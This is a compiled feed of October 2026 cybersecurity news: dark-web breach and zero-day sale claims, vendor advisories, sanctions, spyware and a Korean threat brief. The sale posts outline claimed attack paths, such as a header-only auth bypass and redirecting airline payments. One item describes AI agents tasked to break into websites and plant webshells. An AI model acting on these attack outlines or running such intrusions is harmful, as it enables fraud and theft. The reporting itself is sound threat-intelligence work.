OpenAI Saudi national bugging case shows threat to U.S. leadership in AI: DNI Clayton | Kevin Breuninger, CNBC  U.S. companies and the Trump administration both "need to be wary" of foreign espionage attempts as the race for artificial intelligence dominance continues, Director of National Intelligence Jay Clayton told CNBC on Friday.  AI "amplifies" existing cybersecurity risks toward U.S. digital infrastructure, which is interconnected with critical systems related to everything from public goods to the national defense and global communications, Clayton said on "Squawk Box."  It's "why we're focused on hardening those systems" and using "our commitment to continue to lead to stay ahead of those nefarious actors," said Clayton, who leads a new White House AI task force.  Clayton was asked how concerned Americans should be with the threat of foreign spying in light of the recently revealed case charging Saudi national Abdulrahman Alfozan with allegedly installing a recording device in an OpenAI executive conference room. Alfozan has not been charged with espionage; the federal charge involves alleged interception of oral communications.  Alfozan, who was an OpenAI employee, had booked a one-way plane ticket to Saudi Arabia with his wife and another family member prior to his arrest, according to federal prosecutors.  "The short answer to your question is espionage, both commercial espionage, and I would say state-sponsored espionage, are realities," Clayton said.  "It's something that our private sector companies need to be wary of. We, as a government, need to be wary of," he said.  The OpenAI incident "shows the lengths that people will go to try and supplant our leadership in this, or at least stay close to us in this emerging technology," Clayton said.  An ex-CIA official, speaking on condition of anonymity to discuss non-public information, told CNBC this week that the case is "probably the tip of the iceberg."  Clayton, who was appointed AI czar earlier this month, said that the task force's "very good" inaugural meeting at the White House on Thursday built on the accord signed by President Donald Trump and a number of AI leaders at the White House last month. Trump had described the agreement, which includes industry pledges to police AI risks itself, as "morally binding."  The task force also established three subcommittees that are focused on different AI-related issues. One is tasked with reporting and response, another with assessing critical infrastructure and working with the private sector, and a third with law enforcement and responsibility, Clayton said.  The DNI reiterated to CNBC that the Trump administration is intent on staying ahead in the AI race.  "We're not the only ones developing it. There are vectors in this technology that are coming from some of our known adversaries and competitors," he said. "The Chinese, the Russians, the Iranians, the North Koreans all have significant technical capability. We need to stay ahead of them."  cnbc.com/2026/10/16/ai-espio…

sample_tweets.text: Just watched the @netflix Instadocs about the @OpenAI cyberattack on @huggingface. Super disappointing, as they went for maximum anthropomorphism of the technology and full doomer mode.  I spent more than two hours with them trying to correct all their mistakes and ground this in reality, explaining that agents are technological systems, not aliens. But it looks like the drive to scare people for maximum views was too strong.  Also, they didn’t mention the lack of containment and monitoring of the agents, how closed-model safeguards blocked our defensive work, or how we defended ourselves with AI using an open model. And that we still lack a lot of information and transparency, including full agent traces and that companies need to remain accountable for what their agents do.  It ends up being a fun sci-fi movie though!

IMF Warns That AI Bubble Could Take Down the Entire World Economy | Frank Landymore, Futurism  Fears of an AI bubble have been growing for years. And now the International Monetary Fund is the latest to sound the alarm.  In its Global Financial Stability Report published last week, the global financial institution warned that markets everywhere are increasingly at the mercy of precarious AI investments.  The untold billions poured into AI has driven economic growth, the IMF says, but the boom could quickly invert if profits, which so far have largely proven elusive, never come to fruition — or at least not proportionately with the epic investment levels. AI stocks would tank, and the resulting market correction would send powerful shocks across the global economy.  “Growing leverage could be a catalyst for such a correction,” the IMF warned in a blog post about its findings. “Hyperscalers, as the largest data center operators are known, are borrowing more and more, while investors have been leveraging to invest in AI stocks.”  The report also casts a wary eye to the circular nature of AI financing, in which the biggest benefactors and beneficiaries of AI companies are other AI companies. Nvidia, for example, agreed to invest $30 billion in OpenAI and provide another $105 billion towards an OpenAI data center; OpenAI is one of Nvidia’s biggest customers, relying on its chips to power and train its AI models, so a lot of those billions will go straight back to Nvidia when its buys more chips. Besides creating a mirage of robustness, it also means that their financial health is inextricably tangled with each other.  “Stress at key companies receiving investment could lower revenue forecasts and investment valuations, which in turn would weaken the value of the accumulated debt in those deals,” the IMF wrote. “Our review of 14 such transactions since 2023 found about $300 billion in equity investments and $650 billion in debt, in exchange for $1.4 trillion in future revenue commitments.”  A disastrous AI-driven market correction isn’t the only economic catastrophe potentially looming. The IMF is also worried about an increase in government bond yields, or interest rates, or a potential major cyberattack targeting critical government and financial institutions — a strike that could feasibly be assisted by powerful AI models.  The IMF is far from the only one to caution about an AI bubble, but as the stewards of the global economy, theirs is one of the weightiest warnings yet. Fears were freshly stoked again earlier this month when it was reported that OpenAI’s annualized revenue was $20 billion lower than anticipated, dampening hopes that it would soon be on the road to profitability. Everyone knows not to put all your eggs in one basket, but who can stop the runaway freight train of the global economy?  futurism.com/future-society/…

🚨Threat Actor Claims Critical 0-Day in NZ Government Certificate API  A threat actor is offering a purported critical zero-day vulnerability for sale on an underground forum, alleging that the New Zealand Department of Internal Affairs (DIA) has exposed its production certificate issuance API to unauthenticated attacks. The post claims the flaw allows attackers to create and modify citizen certificate orders without any form of authentication, potentially compromising the integrity of government records.  According to the listing, the vulnerability affects the DIA's REST API hosted on an Azure API Management gateway. The actor alleges that the endpoint enforces zero authentication, relying solely on a client-version header (X-Version) that can be easily extracted from public JavaScript bundles. The claimed impact includes the ability to submit fake orders with arbitrary Personally Identifiable Information (PII) such as names, dates of birth, and birthplaces into the production database.  The seller asserts that the flaw enables several critical actions, including: - Creating fake, persisted certificate orders with arbitrary citizen PII - Modifying existing orders via an Insecure Direct Object Reference (IDOR) write without ownership checks - Poisoning data integrity to cause operational disruption or identity fraud - Leaking internal backend infrastructure details via error responses  The Department of Internal Affairs is the primary government agency responsible for maintaining New Zealand's civil records, including births, deaths, marriages, and citizenship. A compromise of this system could have significant implications for national security and public trust in government digital services. The actor has listed the price for the full unredacted Proof of Concept (PoC) at $1,500, demanding payment before revealing the specific URLs, tenant details, and backend hosts.  At the time of reporting, the alleged breach has not been independently verified by the New Zealand government or security researchers. The DIA has not yet issued a public statement regarding the claim.  #NewZealand #DIA #ZeroDay #IDOR #AzureAPIM #DarkWeb #CyberSecurity

⚠️ Threat Actor Offers 'Critical 0-Day' for Garuda Indonesia Financial API  A darkweb forum post alleges the discovery of a critical vulnerability in the financial infrastructure of Garuda Indonesia, a major Southeast Asian airline group. The threat actor claims to have identified an unauthenticated SOAP API endpoint that allows unauthorized access to the financial ledgers of multiple airline tenants within the group. The post, titled "Critical vulnerabilities for sale garuda-indonesia.com," lists the target as a "Major Southeast Asian Airline Group" and prices the exploit at $1,300.  According to the listing, the vulnerability is classified as a Broken Access Control or Missing Authentication issue with a claimed CVSS score of 10.0. The actor asserts that the server parameter in the API routes database operations without requiring any session, token, or multi-factor authentication. The post details several alleged capabilities enabled by this flaw:  *   **Redirect Money:** Changing the receiving bank account of approved payments to an attacker-controlled account. *   **Tamper Amounts:** Altering payment amounts, such as reducing a multi-billion IDR payment to 1 IDR. *   **Forge Approvals:** Erasing director approvals and forging verifier identities. *   **Dump Ledgers:** Downloading full financial data for over seven airline tenants without login credentials.  The thread includes a redacted Proof of Concept (PoC) demonstrating a baseline read and a subsequent update operation where the bank name was changed to "ATTACKER BANK 999" and the amount to "1.0000 IDR," with the system returning a success message. The actor claims the data was restored after the test. Exploitable endpoints listed include UpdatePayment, Verification, ResetApproval, GetReport, and SendToIssued.  Garuda Indonesia is the flag carrier of Indonesia and one of the largest airline groups in Southeast Asia, operating multiple brands including Citilink and TransNusa. A breach of this nature could expose sensitive financial records and potentially enable direct financial fraud if the claims are accurate. At the time of reporting, the alleged breach has not been independently verified by Garuda Indonesia or security researchers.

🚨 Threat Actor Claims Full Database Access to JAMCO Aerospace  A darkweb forum post alleges that a threat actor has obtained full database access to JAMCO Aerospace, a major aerospace and defense company. The post, published on October 17, 2026, by an actor using the handle 'OlliverQueen,' claims to possess comprehensive access to the company's internal data infrastructure.  JAMCO Aerospace is a prominent joint venture between the Saudi Arabian General Investment Authority (SAGIA) and the German aerospace group MTU Aero Engines AG. Headquartered in Riyadh, the company specializes in the manufacturing of aircraft engines and components for commercial and military aviation. As a critical player in the global supply chain for aircraft propulsion systems, the organization holds significant intellectual property regarding engine design, manufacturing processes, and proprietary technical specifications.  The threat actor's track record suggests a pattern of targeting large multinational corporations and financial institutions with claims of database breaches. Recent posts by 'OlliverQueen' on underground forums include alleged leaks of customer data from GXS Bank in Singapore, LTIMindtree (LTM), Optum, and AOL, often accompanied by samples of sensitive personal information such as names, addresses, phone numbers, and account details. The actor typically monetizes these claims by selling access or specific datasets for cryptocurrency payments.  If authentic, the exposure of JAMCO Aerospace's database could have severe implications for the defense sector, potentially enabling industrial espionage, theft of trade secrets, or targeted attacks on supply chain partners. However, no independent verification of this specific claim has been provided, and JAMCO Aerospace has not yet publicly commented on the allegation. At the time of reporting, the alleged breach remains unverified.  #JAMCOAerospace #DataBreach #AerospaceSecurity #DarkWeb #ThreatIntelligence #CyberSecurity

🚨 Threat Actor Claims Full Breach of Liga MX Internal Database  A post on an underground forum alleges that the central internal database of Liga MX and the Mexican Football Federation (FMF), known as SIID, has been fully extracted. The threat actor claims to have obtained sensitive operational data, including production database connection strings, JWT signing keys, and password encryption passphrases, which could potentially allow for further unauthorized access to the platform's infrastructure.  According to the listing, the stolen data includes a significant volume of user and player records:  - 12,679 user accounts (out of 13,171 registered) with passwords stored in plain text across LIGA MX, FMF, club, MLS, and federation portals - 334 salary records for Liga MX and Expansión BBVA players, detailing contract IDs, monthly amounts in MXN, and payment counts - 336 player files containing CURP (Mexican national ID), RFC (tax ID), and medical data such as blood type, Rh factor, allergies, height, and weight - 799 official Fan ID tickets in PDF format - 4,193 internal SQL query files from the entire platform - 5 production database connection strings (LIGAMX\PRIMARYDB, FMF\DBFMF, Amateur\SAF) along with SMTP credentials  Liga MX is the top professional football league in Mexico, operating under the umbrella of the Mexican Football Federation. The exposure of plain-text credentials and production database keys represents a severe security failure if authentic, as it could enable lateral movement within the organization's network. The inclusion of medical and financial data for players raises significant privacy concerns under Mexican data protection laws.  The identity of the threat actor remains unknown, as the post was made by an unverified user on the forum. At the time of reporting, neither Liga MX nor the FMF has publicly acknowledged the breach, and the claims regarding the data extraction have not been independently verified.  #DataBreach #LigaMX #FootballSecurity #DarkWeb #CyberSecurity #Mexico

Here are some documentaries worth adding to your watchlist:  * Hackers (1985) — early hacker culture and the people behind it * In the Realm of the Hackers (2003) — underground hacker communities * Hacking Democracy (2006) — election technology, security, and trust * We Are Legion (2012) — the story of Anonymous and internet activism * Terms and Conditions May Apply (2013) — how personal data is collected and monetized * The Internet’s Own Boy (2014) — Aaron Swartz, information freedom, and activism * Citizenfour (2014) — Snowden, surveillance, and the global privacy debate * Zero Days (2016) — Stuxnet and the rise of cyber weapons * Risk (2016) — the personal and global risks surrounding WikiLeaks and digital activism * The Great Hack (2019) — data exploitation, political profiling, and social media influence * Kill Chain (2020) — election security and foreign interference risks * The Perfect Weapon (2020) — cyber conflict as a geopolitical tool * Web of Make Believe (2022) — online manipulation, conspiracy, fraud, and digital harm * Cyberbunker (2023) — the criminal ecosystem behind one of Europe’s notorious cybercrime hubs  Analyst Note:  The best cybersecurity documentaries are not just about “hackers.”  They explain the bigger picture:  * Technology * Human behavior * Surveillance * Geopolitics * Privacy * Disinformation * Cybercrime * Ethics  Watch the stories.  Then study the systems behind them.  #DDW #CyberSecurity #CyberDocumentary #ThreatIntelligence #Cybercrime #Privacy #OSINT #Hacking

🚨 SIEMENS SOFTWARE CENTER FLAW EXPLOITED IN CLICKFIX MALWARE ATTACKS (CVE-2026-110936)  Siemens ProductCERT has confirmed active exploitation of CVE-2026-110936, a DLL side-loading flaw in Siemens Software Center (CVSS 4.0: 8.4).  • Attackers bundled a genuine, validly signed copy of Siemens Software Center with their own malicious DLLs, which the vulnerable version loaded at startup • The bundle was spread outside official Siemens channels; Siemens says no Siemens system, product or update channel was breached • Siemens links the activity to the Romulus multi-platform ClickFix campaign (fake "I am not a robot" prompts that trick users into pasting commands) • Fix: Software Center V4.0.9.8; existing installs update automatically on next start • Warning signs: Software Center in startup apps/Task Scheduler on a PC that never had it, an "SM Software Provisioning Service" folder under AppData\Local\Programs, or SiemensSoftwareCenter.exe launched by msiexec from AppData  ⚠️ Analyst Note: Official vendor confirmation, not a dark-web claim. Because the Siemens binary itself is genuine, hash-based blocking won't catch it. Hunt on folder paths and behavior, block the IoCs in Siemens' post, and never paste commands from a web page into Run or PowerShell. 🚨 UNIT 42: PAN-OS CVE-2026-0257 ATTACKERS PIVOT FROM VPN TO VMWARE, DUMP DOMAIN CREDENTIALS OFFLINE  Palo Alto Networks Unit 42 updated its threat brief on Oct 19, 2026 with new post-exploitation detail for CVE-2026-0257, the GlobalProtect authentication bypass in PAN-OS (CVSS 4.0: 7.8, fixes available since May).  What Unit 42 reports: • Attackers use the flaw as initial access, bypass MFA to open a VPN session, then do recon with RMM tools and move laterally over RDP and SMB • In one notable case they jumped from the VPN gateway to vCenter, disabled ESXi's execInstalledOnly protection, and dumped credentials offline from a domain controller's virtual disk (VMDK), bypassing in-guest EDR • Some actors chain it with Veeam exploits (CVE-2023-27532) to hit backups • Unit 42 names Qilin and Inc among ransomware operators exploiting the CVE; investigations since June span sectors from healthcare to government  ⚠️ Analyst Note: This is new post-exploitation detail, not a new zero-day. Unit 42 does not name the actor behind the vCenter case, and incident dates and victim counts are not disclosed. Exposure depends on GlobalProtect authentication override cookies and certificate settings: patch or apply Palo Alto's workarounds, and investigate any unexpected VPN sessions.  Primary: unit42.paloaltonetworks.com/… Advisory: security.paloaltonetworks.co… #DDW #DarkWeb #PaloAlto #PANOS #GlobalProtect #VMware #Ransomware #CVE #ThreatIntelligence

🚨 FBI ARRESTS CANADIAN RANSOMWARE NEGOTIATOR IN SHINYHUNTERS INVESTIGATION — NEW ALLEGATIONS EMERGE  A Canadian cybersecurity executive whose career involved helping ransomware victims negotiate with cybercriminals has been arrested on federal extortion-related charges.  Edward “Ed” Dubrovsky, 54, was arrested in Pennsylvania on October 8, 2026, as the FBI intensified its investigation into ShinyHunters.  Here’s what we know:  Dubrovsky worked in ransomware negotiation and cyber-extortion response. Federal court records identify allegations involving conspiracy to extort money through threats to disclose information and interference with commerce through extortion. FBI Director Kash Patel announced the arrest of another suspected ShinyHunters co-conspirator on October 9. Multiple news organizations identified Dubrovsky as the person arrested, citing sources familiar with the investigation. The underlying charging documents remain partly sealed.  🔴 NEW DEVELOPMENT — OCTOBER 19  KrebsOnSecurity reports that federal investigators are examining alleged relationships between ShinyHunters and executives working in ransomware negotiation.  According to sources cited in the investigation:  Some negotiators allegedly knew about ShinyHunters victims before those organizations were aware of the breaches. Investigators reportedly examined Signal communications involving suspected ShinyHunters associates and ransomware negotiators. Sources alleged Dubrovsky had prior knowledge of sensitive FBI data being stolen. Investigators reportedly suspect an executive at a separate U.S. consulting firm helped operate a ShinyHunters victim-extortion website.  These allegations have not been proven in court.  ⚠️ DDW Analyst Note:  This investigation raises a disturbing question for the ransomware-response industry:  What happens when the people hired to negotiate with cybercriminals allegedly develop relationships that go beyond legitimate incident response?  Ransomware negotiators routinely handle highly confidential information, sensitive communications and potentially millions of dollars in payment negotiations.  Trust and independence are fundamental to that role.  Dubrovsky is presumed innocent unless proven guilty. The precise allegations and evidence against him have not been fully disclosed publicly.  Original investigation — KrebsOnSecurity: krebsonsecurity.com/2026/10/…  Reuters: reuters.com/legal/government… #DDW #ShinyHunters #Cybercrime #Ransomware

🇺🇸 🚨 US SANCTIONS FIVE CHINESE ENTITIES OVER GOOGLE TRADE-SECRET THEFT  The US State Department says it is sanctioning five China-based entities, including MiraclePlus and Shanghai Zhisuan Technology, connected to PRC national Linwei Ding, who was convicted of stealing Google trade secrets. OFAC listed the five entities on Oct 19, 2026 under the Protecting American Intellectual Property Act (PAIPA).  What OFAC and the State Department say: • Designated: MiraclePlus (Qiji Chuangtan Beijing Investment Management), two MiraclePlus RMB venture funds, a related Qiji Chuangtan partnership, and Shanghai Zhisuan Technology • All five were added to OFAC's Non-SDN Menu-Based Sanctions List with their property blocked, plus restrictions on US loans, foreign exchange, banking transfers and US investment • OFAC issued two PAIPA general licenses, one authorizing the wind-down of transactions with the entities blocked on Oct 19 • State says a US federal jury convicted Ding on Jan 29, 2026 of seven counts of theft of trade secrets, covering thousands of pages of Google confidential information on what State calls "super intelligence" technology  ⚠️ Analyst Note: This is a sanctions designation, not a new Google breach. Sanctions are not criminal convictions: the conviction is Ding's, and the government has not publicly detailed each entity's role. The trade-secret link comes from the State Department and the five-entity listing from OFAC; there is no independent corroboration of the entities' roles. This is not compliance advice.  Source: ofac.treasury.gov/recent-act… #DDW #OFAC #Sanctions #TradeSecrets #Google #China #AI #Cybersecurity

🌐 🚨 EXPOSED CAIRN PANELS REVEAL AI-AGENT WEBSITE INTRUSION CAMPAIGN  Security firm NorForge says it found more than 20 internet-exposed panels of Cairn, an AI agent platform, likely tied to malicious operations in which autonomous agents probed and broke into websites. Reuters independently reviewed one operator's Cairn records and reports intrusions into websites of more than 100 companies. Both were published Oct 19, 2026.  What NorForge and Reuters say: • NorForge's largest cluster (Chinese-language) ran 1,100+ attack projects across 14 panels, mostly against e-commerce sites • Reuters, counting differently, says the Chinese-speaking operator's agents had attempted to break into more than 1,200 sites • Tasks told agents to find unauthenticated RCE and plant an "uploader" webshell; NorForge confirmed one live webshell on a large hardware parts vendor's site • Deere told Reuters it took remediation actions; SharkNinja says a standalone product-support site was hit and the threat contained; Cummins is investigating a possible attack on a site run by a third-party vendor • NorForge found hundreds of secrets exposed in the open panels, 11% verified valid  ⚠️ Analyst Note: Reuters could not determine how much data was extracted, and a company-wide compromise is not established; company responses do not confirm every dashboard claim. Chinese-language tasking does not establish nationality or state sponsorship; NorForge saw financial motives and no obvious state activity. No CVE or patch applies here.  Source: norforge.com/blog/inside_cai… #DDW #AI #AIAgents #Cairn #Ecommerce #Webshell #Cybersecurity

🇷🇸 🚨 CITIZEN LAB: PEGASUS SPYWARE INFECTED BELGRADE UNIVERSITY RECTOR'S IPHONE  Citizen Lab says it found with high confidence that the iPhone of Professor Vladan Đokić, Rector of the University of Belgrade and a prominent supporter of Serbia's student pro-democracy movement, was infected with NSO Group's Pegasus spyware in 2026. The research, done with Serbia's SHARE Foundation, was published Oct 19, 2026.  What Citizen Lab says: • The infection used a zero-click exploit; no click or file opening was needed • Forensic artifacts were analyzed at Đokić's request and with his consent • A former organized-crime prosecutor who worked on a Belgrade corruption case received an Apple Threat Notification in August, a high-confidence sign of mercenary-spyware targeting • At least 16 members of Serbian civil society are now publicly known to have been targeted or infected with mercenary spyware; investigations are ongoing  ⚠️ Analyst Note: Citizen Lab has not said who operated the spyware or which exploit or CVE was used, so this is not a new zero-day disclosure and patch status is unknown. The prosecutor's case is confirmed targeting, not a confirmed infection. SHARE took part in the same investigation, so it is not independent corroboration.  Source: citizenlab.ca/research/pegas… #DDW #Pegasus #Spyware #NSOGroup #Serbia #Cybersecurity

최근 사이버 위협은 AI 기술을 악용한 공격과 공급망 공격이 결합된 형태로 진화하고 있습니다. 특히 AI 기반 모의해킹 툴인 ARTEX가 실제 공격에 악용되거나, 오픈소스 패키지 저장소(PyPI, npm)를 통한 크라임웨어 유통이 활발해지는 등 개발자 생태계를 겨냥한 위협이 증가하고 있습니다([AhnLab ASEC](https://asec.ahnlab.com/ko/95882/)). 또한, MITRE ATT&CK v20 업데이트를 통해 AI 남용 및 MFA 우회 기법이 공식적으로 카탈로그화되는 등 방어 체계 또한 AI 위협 대응 중심으로 재편되고 있습니다([SecurityWeek](https://securityweek.com/mitre-attck-v20-catalogs-ai-abuse-mfa-bypass-water-utility-attacks/)).

### 2. 주요 위협 행위자 / 캠페인
- **TAG-217**: ARTEX 프레임워크를 사용하여 한국 금융 기관을 타겟팅한 공격 수행([Recorded Future](https://www.recordedfuture.com/blog/tag-217-artex-south-korean-banks)).
- **Spikey Scorpius (Qilin) / Tarnished Scorpius (Inc)**: PAN-OS 취약점(CVE-2026-0257)을 악용하여 랜섬웨어 공격 수행([Unit42](https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/)).
- **ShinyHunters**: FBI 데이터 유출 사건과 연루된 해킹 그룹으로, 랜섬웨어 협상가들이 해당 그룹의 갈취 사이트를 운영했다는 의혹 제기([Krebs on Security](https://krebsonsecurity.com/2026/10/feds-suspect-ransom-negotiator-ran-shinyhunters-extortion-site/)).

### 3. 한국 관련 위협
- **금융권 타겟 공격**: TAG-217이 AI 기반 ARTEX 프레임워크를 활용해 한국 금융 서비스를 공격한 사례가 확인됨([Recorded Future](https://www.recordedfuture.com/blog/tag-217-artex-south-korean-banks)).
- **산업기술 유출 대응**: 정부가 반도체 등 첨단산업 기술 유출 방지를 위해 산업통상부에 특별사법경찰 도입을 추진 중([데일리시큐](https://www.dailysecu.com/news/articleView.html?idxno=208964)).
- **보안 솔루션 해외 진출**: 에브리존이 인도네시아 보안 행사에서 안티랜섬웨어 'WhiteDefender' 기술을 소개함([데일리시큐](https://www.dailysecu.com/news/articleView.html?idxno=208965)).

### 4. 주요 CVE / 취약점
- **CVE-2026-97229**: GitLab CE/EE CI/CD RCE 취약점, CVSS 10.0(Critical), 패치 권고([이스트시큐리티 알약](https://blog.alyac.co.kr/5783)).
- **CVE-2026-77524**: KEDA 클러스터 권한 상승 취약점, CVSS 9.9, 패치 권고([CyStackSecurity](https://twitter.com/CyStackSecurity/status/2112531421210566788)).
- **CVE-2026-0257**: PAN-OS 취약점, 랜섬웨어 그룹에 의해 활발히 악용 중([Unit42](https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/)).
- **CVE-2026-106173**: FortiSIEM gRPC 경로 탐색 및 RCE 취약점, PoC 공개됨([Horizon3](https://horizon3.ai/attack-research/)).
- **CVE-2026-111943**: Go 언어 eMudhra CA 키 차단, 긴급 업데이트 권고([TheHackerNews](https://thehackernews.com/2026/10/go-issues-emergency-update-blocking.html)).

### 5. IOC 요약
- **CVE**: CVE-2026-35029, CVE-2026-59823 ([Check Point Research](https://research.checkpoint.com/2026/when-llm-gateways-go-wrong-findings-from-litellm/)), CVE-2026-0257 ([Unit42](https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/)), CVE-2026-97229 ([이스트시큐리티 알약](https://blog.alyac.co.kr/5783)).
- **해시**: eb... (SPKI hashes for eMudhra CA keys) ([LandscapeThreat](https://twitter.com/LandscapeThreat/status/2112531386015903902)).

### 6. 즉각 대응 권고
- **GitLab 및 PAN-OS 패치**: CVE-2026-97229 및 CVE-2026-0257에 대한 최신 보안 패치를 즉시 적용하고, 비정상적인 접근 로그를 모니터링하십시오.
- **Go 언어 환경 점검**: Go 1.27.3/1.26.10 버전으로 업데이트하여 차단된 CA 키를 사용하는 인증서 체인을 제거하십시오.
- **AI 툴 사용 거버넌스 강화**: 조직 내 AI 에이전트 및 자동화 워크플로우에 대한 접근 제어와 데이터 유출 방지 정책을 재검토하십시오.

### 7. 위협 수준 평가
- **점수**: 8/10
- **근거**: AI 기반 공격 툴의 확산과 주요 인프라(PAN-OS, GitLab)에 대한 활발한 취약점 악용이 동시에 발생하고 있어 기업의 보안 위협이 매우 높은 상태임.

news_articles.summary: 랜섬웨어 대응 전문 엔드포인트 보안기업 에브리존이 인도네시아에서 열린 보안 행사에 참가해 안티랜섬웨어 솔루션 '화이트디펜더(WhiteDefender)'를 선보였다. 이번 행사를 통해 현지 고객 대상 세미나를 열고 파트너와의 협력 방안을 논의했다.에브리존은 전시 부스에서 행위 기반 랜섬웨어 탐지·차단 기술과 보호 대상 파일의 자동 복원 기능을 소개했다.화이트디펜더는 악성코드 시그니처에 의존하지 않고 파일 암호화 등 의심 행위를 분석해 원인 프로세스를 차단한다. 순간 백업과 자동 복원을 연계해 탐지부터 복원까지 지원하는 점이 특징이다.

news_articles.title: 정부, 산업기술 유출 차단 총력…산업부에 특별사법경찰 도입 추진
news_articles.summary: 정부가 반도체와 디스플레이 등 국가 첨단산업의 핵심기술 유출을 막기 위해 산업통상부에 특별사법경찰 권한을 도입하고 범부처 수사 공조체계를 강화한다. 기술유출 범죄에 대한 경제적 제재를 확대하는 한편, 중소기업과 대학, 협력사 등 보안 취약 분야에 대한 관리·감독도 강화할 방침이다.산업통상부(장관 김정관)는 10월 19일 서울 종로구 한국무역보험공사에서 제76회 산업기술보호위원회를 개최하고 산업기술 유출 방지를 위한 종합적인 제도 개선방안을 논의했다고 밝혔다.이번 회의에는 기술보호 정책과 기술유출 조사·수사 과정의 범부처 협력을 강화
